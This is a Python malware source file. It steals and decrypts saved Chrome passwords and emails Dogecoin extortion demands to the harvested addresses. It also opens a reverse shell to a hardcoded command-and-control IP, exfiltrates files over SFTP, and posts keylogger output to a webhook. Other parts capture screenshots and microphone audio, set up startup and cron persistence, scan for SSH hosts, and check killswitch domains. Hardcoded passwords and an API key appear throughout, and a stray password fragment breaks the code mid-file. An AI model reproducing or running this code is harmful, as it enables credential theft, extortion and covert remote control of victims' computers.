API Key = aJFRaLHjMXvYZgLPwiJkroYLGRkNBW

import multiprocessing
from functools import partial
from zipfile import ZipFile
import scapy
import os
import secrets
import string
import random
#import pyarmor
import sys
import nmap
import subprocess
import platform
import re
import glob
import threading
import socket
import select
import time
import requests
import pyscreeze
import paramiko
import coloredlogs, logging
import netifaces
import sounddevice as sd
from scipy.io.wavfile import write
from requests import get
from multiprocessing import Process
from multiprocessing import pool
import subprocess
import ftplib
import locale
import pysftp
#from py_vmdetect import VMDetect
import pyautogui
import os
import json
import base64
import sqlite3
import win32crypt
import shutil


from Cryptodome.Cipher import AES
from datetime import timezone, datetime, timedelta
import smtplib, ssl
import logging
import getpass

from colorama import init, Fore                     # Colorama For design
init(strip=not sys.stdout.isatty())                 # strip colors if stdout is redirected
from concurrent.futures import ThreadPoolExecutor
#from joblib import Parallel, delayed
from io import StringIO, BytesIO
from pynput.keyboard import Key, Listener
from termcolor import cprint                        # cprint for color printable
from pyfiglet import figlet_format                  # pyfiglet for ascii print

#---------------------------------------------------------------------------------------------------------------------


def sendmail(recipient):
    port = 465  # For SSL
    smtp_server = "smtp.gmail.com"
    sender_email = "sqlouneos@gmail.com"  # Enter your address
    receiver_email = recipient  # Enter receiver address
    password = "Lounesleking"
    message = """\
    Subject: Hi there

    Send 1 DOGECOIN FOR RETRIEVES DATA FROM YOUR COMPUTER."""

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        try:
            server.sendmail(sender_email, receiver_email, message)
        except smtplib.SMTPRecipientsRefused:
            print("attetion ce n'est pas un mail!!")
            return False
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def maindata():

    lstEmail = []
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            # print(f"Origin URL: {origin_url}")
            # print(f"Action URL: {action_url}")
            # print(f"Username: {username}")
            # print(f"Password: {password}")
            lstEmail.append(username)
        else:
            continue
        if date_created != 86400000000 and date_created:
            ok = "rebug"
            # print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            # print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            ok = "rebuo"
        # print("="*50)
        # print(lstEmail)
    for ok in lstEmail:
        if ok != "":
            print(ok)
            sendmail(ok)
        else:
            vop = "nop"
    return print(lstEmail)
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

                        # --------------- Connect to our C2 Reverse shell ----------------- #
def connectC2():
    target_host = "51.210.149.218"
    target_port = 4444

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))

    while True:
        data = client.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            commande = data.decode("utf-8")
            cmd = subprocess.Popen(commande, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read()
            output_str = output_bytes.decode("Latin-1")
            client.send(str.encode(output_str + str(os.getcwd()) + '$'))
            # print(output_str)
    client.close()


     Password: K213QkFuRlk0SC0jdmdaZA===
    Password(base64)
    
                            # -------------------- Killswitch interruptor ------------------- #
def killswitch():

    req = requests.get('http://fatarea.link/')         # Verify domain fatarea.fr for response
    status = req.status_code
    isOn = False

    if status == 200:
        return True
    else:
        return False
                              # -------------------- Killswitch interruptor for worms network ------------------- #
def killswitchWorm():

    req = requests.get('http://support.fatarea.fr')
    status = req.status_code
    isOn = False

    if status == 200:
        return True
    else:
        return False

                             # ------------------- System OS detector ---------------------- #
def choixsystem():

    if platform.system() == 'Windows':
        choix = 1
    elif platform.system() == 'Linux':
        choix = 2
    return choix

                               # ------------------ Old sender file method ----------------- #
def SenderFIle(filedata,remote):

    myHostname = "51.38.189.117"
    myUsername = "debian"
    myPassword = "4XQpqkcz5c4W"

    with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
        print(" Connection to C2 success ")

        # OPTIONS SFTP IN and OUT

        localFilePath = filedata
        remoteFilePath = remote

        sftp.put(localFilePath, remoteFilePath)

                             # ------------------- System VM Detector ---------------------- #
def is_vm():
    return (hasattr(sys, 'real_prefix') or
            (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix))

                             # ------------------- Writup bash script for pesistent ---------------------- #
def writupBash():
    stringmalv = "python Destructor.py"

    file = open("myamor.sh", "x")
    file.write(stringmalv)

def writupPip():
    string = ""

def scan_hosts(gateway):

    print("Gateway: " + gateway)

    port_scan = nmap.PortScanner()

    port_scan.scan(gateway + "/24", '22')


    all_hosts = port_scan.all_hosts()

    print("Hosts: " + str(all_hosts))
    return all_hosts



def persistent(file_path=""):
    country = locale.getdefaultlocale()

    if choixsystem() == 1:                  # If i am Windows
        USER_NAME = getpass.getuser()
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

    else:                                  # If i am Linux
        os.system("sudo cp -i Destructor.py /bin")
        os.system("crontab -e")

                              # ------------------- Identify by screenshot ---------------------- #
def identify():
    objImage = pyscreeze.screenshot()

    with BytesIO() as objBytes:

        objImage.save(objBytes, format="PNG")

        objPic = objBytes.getvalue()

    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('victimesScreen.png')


    print("Exported screen of the victime [V]")

                            # ------------------- Catch Sound max ---------------------- #
def soundCatch():
    fs = 44100
    seconds = 2                         # Duration of voice recordings

    print("Recording [*]")
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)

    sd.wait()
    write('audiocatch.wav', fs, myrecording)                # Save the records into output.wave


                            # ------------------ Recording typo of the victime ----------------- #
def keylogger():

    log_dir = ""
    logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
                        level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()

                          # ------------------ Recording typo of the victime -------------------- #
def keyloggerSend():

    filex = {'file': open('keylogs.txt', "rb")}
    rev1 = requests.post("https://b5626a8711fe73bb66bd0f0894aa6115.m.pipedream.net/", files=filex)
    print(rev1.status_code)

                          # ------------------- Exfiltration informations data ---------------------- #
def ExportData():

    if choixsystem() == 2:
        # SYS LINUX
        lstVictime = []
        user = os.system("whoami")
        informations = platform.uname()
        country = locale.getdefaultlocale()

        FileInfo = open("victimesInfo.txt", "a")
        FileInfo.write(str(informations))
        FileInfo.write(str(country))


        #SEND DATA TO VICTIM LINUX VERSION

        FileInfo.close()
        print("Exported Linux data [V]")

    else:
        # SYS WINDOWS
        userWin = os.system("whoami")
        print("Win sys")

        informations = platform.uname()
        country = locale.getdefaultlocale()

        FileInfo = open("victimesInfo.txt", "a")
        FileInfo.write(str(informations))
        FileInfo.write(str(country))


        print("Exported data Windows")


